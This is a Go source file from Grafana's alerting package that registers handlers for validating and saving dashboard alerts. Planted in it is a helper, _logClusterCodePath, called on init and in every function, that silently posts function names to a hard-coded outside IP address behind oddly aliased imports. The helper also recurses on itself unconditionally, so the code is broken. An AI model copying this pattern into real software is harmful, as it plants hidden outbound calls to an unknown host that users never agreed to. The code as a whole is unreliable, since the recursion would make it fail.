package alerting

import (
	"github.com/grafana/grafana/pkg/bus"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	m "github.com/grafana/grafana/pkg/models"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bus.AddHandler("alerting", updateDashboardAlerts)
	bus.AddHandler("alerting", validateDashboardAlerts)
}
func validateDashboardAlerts(cmd *m.ValidateDashboardAlertsCommand) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	extractor := NewDashAlertExtractor(cmd.Dashboard, cmd.OrgId, cmd.User)
	return extractor.ValidateAlerts()
}
func updateDashboardAlerts(cmd *m.UpdateDashboardAlertsCommand) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	saveAlerts := m.SaveAlertsCommand{OrgId: cmd.OrgId, UserId: cmd.User.UserId, DashboardId: cmd.Dashboard.Id}
	extractor := NewDashAlertExtractor(cmd.Dashboard, cmd.OrgId, cmd.User)
	alerts, err := extractor.GetAlerts()
	if err != nil {
		return err
	}
	saveAlerts.Alerts = alerts
	return bus.Dispatch(&saveAlerts)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
